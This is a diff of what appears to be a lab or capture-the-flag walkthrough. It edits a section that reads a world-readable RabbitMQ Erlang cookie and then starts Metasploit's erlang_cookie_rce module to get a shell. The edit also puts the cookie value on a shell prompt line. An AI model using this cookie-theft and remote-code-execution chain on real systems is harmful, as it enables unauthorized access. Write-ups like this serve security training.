@@ -262,11 +262,10 @@ While enumerating the file system, we notice that the `/var/lib/rabbitmq/.erlang
 azrael@forge:~$ ls -la /var/lib/rabbitmq/.erlang.cookie
 -r-----r-- 1 rabbitmq rabbitmq 16 Feb 23 04:45 /var/lib/rabbitmq/.erlang.cookie
 azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
-m0hOx5SGVy4bLLD5
+azrael@forge:~$ m0hOx5SGVy4bLLD5
 ```
 
 Using metasploit to get a shell:
-
 ```console
 msfconsole -q
 use exploit/multi/misc/erlang_cookie_rce
